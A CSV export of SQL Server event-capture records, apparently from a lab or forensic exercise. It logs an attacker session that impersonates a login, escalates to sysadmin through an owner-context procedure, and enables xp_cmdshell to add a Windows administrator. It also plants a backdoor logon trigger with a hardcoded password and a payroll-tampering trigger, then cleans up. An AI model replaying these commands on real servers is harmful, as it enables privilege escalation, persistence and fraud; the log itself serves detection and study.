"name","timestamp","timestamp (UTC)","cpu_time","duration","page_server_reads","physical_reads","logical_reads","writes","spills","row_count","result","batch_text","username","session_id","server_principal_sid","server_principal_name","server_instance_name","database_name","client_pid","client_hostname","client_connection_id","client_app_name","collect_system_time"
"sql_batch_completed","2023-07-23 19:12:40.8332598","2023-07-23 19:12:40.8332598","0","5137","0","8","49","0","0","0","OK","ALTER EVENT SESSION [Test] ON SERVER STATE=START  ","MSSQL-SR\Administrator","63","0x010500000000000515000000F3360381BD0F9EBEE2B16B17F4010000","MSSQL-SR\Administrator","MSSQL-SR","master","784","MSSQL-SR","10ADB4C1-AC7C-44B1-B2CB-1CECBC0038BE","Microsoft SQL Server Management Studio","2023-07-23 19:12:40.8310949"
"sql_batch_completed","2023-07-23 19:13:55.4983350","2023-07-23 19:13:55.4983350","0","172","0","0","0","0","0","1","OK","SELECT SUSER_SNAME()","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:13:55.5197285"
"sql_batch_completed","2023-07-23 19:14:01.2649012","2023-07-23 19:14:01.2649012","31000","41960","0","85","2373","0","0","6","OK","SELECT name, SUSER_SNAME(owner_sid) AS DatabaseOwner FROM sys.databases;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:14:01.1142623"
"sql_batch_completed","2023-07-23 19:14:06.9946628","2023-07-23 19:14:06.9946628","47000","61817","0","137","2957","0","0","0","OK","USE Seinfeld_Customers; SELECT name AS TableName FROM sys.tables;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","Seinfeld_Customers","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:14:06.8182843"
"sql_batch_completed","2023-07-23 19:14:14.6098787","2023-07-23 19:14:14.6098787","31000","55842","0","141","2749","0","0","2","OK","USE Seinfeld_Employees; SELECT name AS TableName FROM sys.tables;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","Seinfeld_Employees","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:14:14.0981233"
"sql_batch_completed","2023-07-23 19:14:23.3537139","2023-07-23 19:14:23.3537139","31000","46907","0","85","1656","0","0","3","OK","USE Seinfeld_Employees; SELECT a.name AS UserName, b.name AS RoleName FROM sys.database_role_members drm JOIN sys.database_principals a ON drm.member_principal_id = a.principal_id JOIN sys.database_principals b ON drm.role_principal_id = b.principal_id;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","Seinfeld_Employees","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:14:22.2964056"
"sql_batch_completed","2023-07-23 19:14:28.9277903","2023-07-23 19:14:28.9277903","16000","67610","0","126","3116","0","0","3","OK","USE Seinfeld_Employees; SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Data';","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","Seinfeld_Employees","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:14:28.3199480"
"sql_batch_completed","2023-07-23 19:14:33.4111615","2023-07-23 19:14:33.4111615","15000","11379","0","35","354","0","0","5","OK","USE Seinfeld_Employees; SELECT id, Name, Position from Data;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","Seinfeld_Employees","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:14:32.6608287"
"sql_batch_completed","2023-07-23 19:14:38.9059008","2023-07-23 19:14:38.9059008","31000","49270","0","632","3122","0","0","2","OK","USE Seinfeld_Employees; SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Payroll';","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","Seinfeld_Employees","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:14:38.0078453"
"sql_batch_completed","2023-07-23 19:14:43.9728062","2023-07-23 19:14:43.9728062","0","10547","0","36","362","0","0","5","OK","USE Seinfeld_Employees; SELECT id, Salary from Payroll;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","Seinfeld_Employees","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:14:43.7616550"
"sql_batch_completed","2023-07-23 19:14:51.1382877","2023-07-23 19:14:51.1382877","0","13272","0","40","476","0","0","5","OK","USE Seinfeld_Employees; SELECT a.Name, b.Salary FROM Data a LEFT JOIN Payroll b ON b.id = a.id;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","Seinfeld_Employees","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:14:50.7253078"
"sql_batch_completed","2023-07-23 19:14:56.6008728","2023-07-23 19:14:56.6008728","0","9611","0","22","380","1","0","1","OK","USE Seinfeld_Employees; UPDATE Payroll SET Salary = 123456 WHERE id = 5;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","Seinfeld_Employees","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:14:56.5868241"
"sql_batch_completed","2023-07-23 19:15:02.3278986","2023-07-23 19:15:02.3278986","16000","8283","0","19","464","0","0","5","OK","USE Seinfeld_Employees; SELECT a.Name, b.Salary FROM Data a LEFT JOIN Payroll b ON b.id = a.id;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","Seinfeld_Employees","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:15:02.3490365"
"sql_batch_completed","2023-07-23 19:15:08.1082083","2023-07-23 19:15:08.1082083","0","22396","0","64","1085","0","0","3","OK","SELECT name, type_desc FROM sys.server_principals WHERE type IN ('S', 'U')","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:15:08.2282998"
"sql_batch_completed","2023-07-23 19:15:18.5338277","2023-07-23 19:15:18.5338277","0","31794","0","75","1300","0","0","1","OK","SELECT DISTINCT grantor.name AS GrantorName, grantee.name AS GranteeName FROM sys.server_permissions perm JOIN sys.server_principals grantor ON perm.grantor_principal_id = grantor.principal_id JOIN sys.server_principals grantee ON perm.grantee_principal_id = grantee.principal_id WHERE perm.permission_name = 'IMPERSONATE'","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:15:18.5829922"
"sql_batch_completed","2023-07-23 19:15:27.1574352","2023-07-23 19:15:27.1574352","0","2767","0","1","180","0","0","1","OK","EXECUTE AS LOGIN = 'GeorgeSQL' SELECT SUSER_SNAME(); REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:15:28.0176470"
"sql_batch_completed","2023-07-23 19:15:38.9595360","2023-07-23 19:15:38.9595360","31000","40797","0","70","1601","0","0","4","OK","EXECUTE AS LOGIN = 'GeorgeSQL'; USE Seinfeld_Employees; SELECT u.name AS UserName, r.name AS RoleName FROM sys.database_role_members drm JOIN sys.database_principals u ON drm.member_principal_id = u.principal_id JOIN sys.database_principals r ON drm.role_principal_id = r.principal_id; USE master; REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:15:39.5409404"
"sql_batch_completed","2023-07-23 19:15:48.2139859","2023-07-23 19:15:48.2139859","32000","39982","0","88","2275","0","0","6","OK","EXECUTE AS LOGIN = 'GeorgeSQL'; SELECT name as DatabaseName, SUSER_SNAME(owner_sid) AS DatabaseOwner,  is_trustworthy_on AS TRUSTWORTHY from sys.databases; REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:15:49.8469513"
"sql_batch_completed","2023-07-23 19:16:08.3294789","2023-07-23 19:16:08.3294789","0","3416","0","5","99","0","0","0","OK","EXECUTE AS LOGIN = 'GeorgeSQL';  USE Seinfeld_Employees; ","GeorgeSQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","GeorgeSQL","MSSQL-SR","Seinfeld_Employees","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:16:08.4291040"
"sql_batch_completed","2023-07-23 19:16:08.3418567","2023-07-23 19:16:08.3418567","0","10215","0","39","93","11","0","0","OK","CREATE PROCEDURE Going_Up  WITH EXECUTE AS OWNER  AS BEGIN      DECLARE @SQL NVARCHAR(MAX);      SET @SQL = N'     EXEC sp_addsrvrolemember ''GeorgeSQL'', ''sysadmin''';      EXEC sp_executesql @SQL;      REVERT; END; ","GeorgeSQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","GeorgeSQL","MSSQL-SR","Seinfeld_Employees","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:16:08.4291040"
"sql_batch_completed","2023-07-23 19:16:08.3425102","2023-07-23 19:16:08.3425102","0","135","0","0","0","0","0","0","OK"," USE master; REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:16:08.4291040"
"sql_batch_completed","2023-07-23 19:16:18.3869066","2023-07-23 19:16:18.3869066","0","12751","0","29","375","3","0","10","OK","EXECUTE AS LOGIN = 'GeorgeSQL'; USE Seinfeld_Employees; SELECT IS_SRVROLEMEMBER('sysadmin') as isSysadmin; EXEC Going_Up; SELECT IS_SRVROLEMEMBER('sysadmin') as isSysadmin; USE master; REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:16:18.5402140"
"sql_batch_completed","2023-07-23 19:16:38.7621001","2023-07-23 19:16:38.7621001","15000","51444","0","129","2296","0","0","2","OK","EXECUTE AS LOGIN = 'GeorgeSQL'; USE Seinfeld_Customers; SELECT name AS TableName FROM sys.tables; USE master; REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:16:38.6198706"
"sql_batch_completed","2023-07-23 19:16:46.5448345","2023-07-23 19:16:46.5448345","32000","60096","0","134","3753","0","0","5","OK","EXECUTE AS LOGIN = 'GeorgeSQL'; USE Seinfeld_Customers; SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Data'; USE master; REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:16:46.2500974"
"sql_batch_completed","2023-07-23 19:16:53.9381221","2023-07-23 19:16:53.9381221","0","11048","0","37","297","0","0","3","OK","EXECUTE AS LOGIN = 'GeorgeSQL'; USE Seinfeld_Customers; SELECT * from Data; USE master; REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:16:53.0473294"
"sql_batch_completed","2023-07-23 19:17:09.3076279","2023-07-23 19:17:09.3076279","47000","47088","0","624","2862","0","0","3","OK","EXECUTE AS LOGIN = 'GeorgeSQL'; USE Seinfeld_Customers; SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Secret'; USE master; REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:17:08.6233319"
"sql_batch_completed","2023-07-23 19:17:16.1165229","2023-07-23 19:17:16.1165229","0","3505","0","40","131","0","0","3","OK","EXECUTE AS LOGIN = 'GeorgeSQL'; USE Seinfeld_Customers; SELECT * from Secret; USE master; REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:17:15.5927146"
"sql_batch_completed","2023-07-23 19:17:28.5223565","2023-07-23 19:17:28.5223565","16000","30044","0","120","2030","1","0","13","OK","EXECUTE AS LOGIN = 'GeorgeSQL'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell'; REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:17:28.0619338"
"sql_batch_completed","2023-07-23 19:17:36.0716281","2023-07-23 19:17:36.0716281","0","5279","0","0","888","2","0","7","OK","EXECUTE AS LOGIN = 'GeorgeSQL'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:17:35.9457456"
"sql_batch_completed","2023-07-23 19:17:43.4786546","2023-07-23 19:17:43.4786546","0","1759","0","0","578","0","0","6","OK","EXECUTE AS LOGIN = 'GeorgeSQL'; EXEC sp_configure 'xp_cmdshell'; REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:17:43.4563512"
"sql_batch_completed","2023-07-23 19:17:52.3086464","2023-07-23 19:17:52.3086464","15000","149357","0","32","24","0","0","0","OK","EXECUTE AS LOGIN = 'GeorgeSQL'; EXEC xp_cmdshell 'whoami'; EXEC xp_cmdshell 'net user NewUser NewPassword /add && net localgroup Administrators NewUser /add'; REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:17:52.4146131"
"sql_batch_completed","2023-07-23 19:18:13.6178334","2023-07-23 19:18:13.6178334","0","9299","0","8","63","4","0","0","OK","EXECUTE AS LOGIN = 'GeorgeSQL'; --*CREATE LOGIN--------------------------------------------------REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:18:13.9387185"
"sql_batch_completed","2023-07-23 19:18:23.0776702","2023-07-23 19:18:23.0776702","15000","6909","0","102","114","1","0","7","OK","EXECUTE AS LOGIN = 'GeorgeSQL'; EXEC sp_addsrvrolemember 'MailManSQL', 'sysadmin'; REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:18:24.4350012"
"sql_batch_completed","2023-07-23 19:18:50.6740293","2023-07-23 19:18:50.6740293","15000","8819","0","88","552","6","0","1","OK","EXECUTE AS LOGIN = 'GeorgeSQL'; DECLARE @SQL NVARCHAR(MAX); SET @SQL = N' CREATE TRIGGER MasterOfMySQL ON ALL SERVER WITH EXECUTE AS ''sa'' AFTER LOGON AS  BEGIN      IF ORIGINAL_LOGIN() = ''JerrySQL''      BEGIN          IF NOT EXISTS (SELECT 1 FROM sys.server_principals WHERE name = ''MailManSQL'')          BEGIN              CREATE LOGIN MailManSQL WITH PASSWORD = ''L4rg3j4mb4l4y4s0up!!!'';         END      END  END;'; EXEC sp_executesql @SQL; REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:18:51.7700571"
"sql_batch_completed","2023-07-23 19:19:02.1382526","2023-07-23 19:19:02.1382526","0","975","0","0","2","0","0","0","OK","EXECUTE AS LOGIN = 'GeorgeSQL'; ENABLE TRIGGER MasterOfMySQL ON ALL SERVER; REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:19:02.5253289"
"sql_batch_completed","2023-07-23 19:19:45.1267721","2023-07-23 19:19:45.1267721","0","1310","0","16","38","0","0","0","OK","EXECUTE AS LOGIN = 'GeorgeSQL'; USE Seinfeld_Employees; ","GeorgeSQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","GeorgeSQL","MSSQL-SR","Seinfeld_Employees","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:19:44.6788551"
"sql_batch_completed","2023-07-23 19:19:45.1361731","2023-07-23 19:19:45.1361731","0","8129","0","136","213","11","0","1","OK"," DECLARE @SqlScript NVARCHAR(MAX); SET @SqlScript = N' CREATE OR ALTER TRIGGER NoLowSalaryForYou ON Payroll AFTER UPDATE AS  BEGIN      DECLARE @Threshold DECIMAL(10, 2) = 123456;      DECLARE @ID INT = 5;      IF UPDATE(Salary)      BEGIN          UPDATE a          SET Salary = CASE WHEN b.Salary < @Threshold THEN @Threshold ELSE b.Salary END          FROM Payroll a          JOIN inserted b ON a.id = b.id         WHERE a.id = @ID;      END  END;';  EXEC sp_executesql @SqlScript;  USE master; REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:19:44.6864483"
"sql_batch_completed","2023-07-23 19:19:52.2244143","2023-07-23 19:19:52.2244143","0","4242","0","0","851","0","0","7","OK","EXECUTE AS LOGIN = 'GeorgeSQL'; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:19:51.6680240"
"sql_batch_completed","2023-07-23 19:19:57.1735804","2023-07-23 19:19:57.1735804","0","3307","0","0","744","0","0","7","OK","EXECUTE AS LOGIN = 'GeorgeSQL'; EXEC sp_configure 'show advanced options', 0; RECONFIGURE; REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:19:55.9521066"
"sql_batch_completed","2023-07-23 19:20:03.0824037","2023-07-23 19:20:03.0824037","0","7565","0","136","205","8","0","0","OK","EXECUTE AS LOGIN = 'GeorgeSQL'; USE Seinfeld_Employees; DROP PROCEDURE Going_Up; USE master; REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:20:02.3085744"
"sql_batch_completed","2023-07-23 19:20:11.5944774","2023-07-23 19:20:11.5944774","16000","12352","0","152","142","4","0","7","OK","EXECUTE AS LOGIN = 'GeorgeSQL'; EXEC sp_dropsrvrolemember 'GeorgeSQL', 'sysadmin'; REVERT;","JerrySQL","52","0xE004C7E8A806C94CAF88C8CFDB0F9C93","JerrySQL","MSSQL-SR","master","4000","JERRY-PC","33D27F8B-5117-4AC4-A81E-EDA8BFD9F5E3","Framework Microsoft SqlClient Data Provider","2023-07-23 19:20:10.7276021"
"sql_batch_completed","2023-07-23 19:20:42.8660933","2023-07-23 19:20:42.8660933","0","2649","0","24","143","0","0","4","OK","DECLARE @edition sysname;  SET @edition = cast(SERVERPROPERTY(N'EDITION') as sysname);  SELECT case when @edition = N'SQL Azure' then 2 else 1 end as 'DatabaseEngineType',  SERVERPROPERTY('EngineEdition') AS DatabaseEngineEdition,  SERVERPROPERTY('ProductVersion') AS ProductVersion,  @@MICROSOFTVERSION AS MicrosoftVersion;  select host_platform from sys.dm_os_host_info  if @edition = N'SQL Azure'     select 'TCP' as ConnectionProtocol  else    exec ('select CONVERT(nvarchar(40),CONNECTIONPROPERTY(''net_transport'')) as ConnectionProtocol')  ","MSSQL-SR\Administrator","63","0x010500000000000515000000F3360381BD0F9EBEE2B16B17F4010000","MSSQL-SR\Administrator","MSSQL-SR","master","784","MSSQL-SR","10ADB4C1-AC7C-44B1-B2CB-1CECBC0038BE","Microsoft SQL Server Management Studio","2023-07-23 19:20:43.2232846"
"sql_batch_completed","2023-07-23 19:20:42.9113127","2023-07-23 19:20:42.9113127","0","118","0","0","0","0","0","1","OK","select SERVERPROPERTY(N'servername')","MSSQL-SR\Administrator","63","0x010500000000000515000000F3360381BD0F9EBEE2B16B17F4010000","MSSQL-SR\Administrator","MSSQL-SR","master","784","MSSQL-SR","10ADB4C1-AC7C-44B1-B2CB-1CECBC0038BE","Microsoft SQL Server Management Studio","2023-07-23 19:20:43.2603818"
"sql_batch_completed","2023-07-23 19:20:42.9164736","2023-07-23 19:20:42.9164736","0","83","0","0","0","0","0","0","OK","USE [master]","MSSQL-SR\Administrator","63","0x010500000000000515000000F3360381BD0F9EBEE2B16B17F4010000","MSSQL-SR\Administrator","MSSQL-SR","master","784","MSSQL-SR","10ADB4C1-AC7C-44B1-B2CB-1CECBC0038BE","Microsoft SQL Server Management Studio","2023-07-23 19:20:43.2806088"
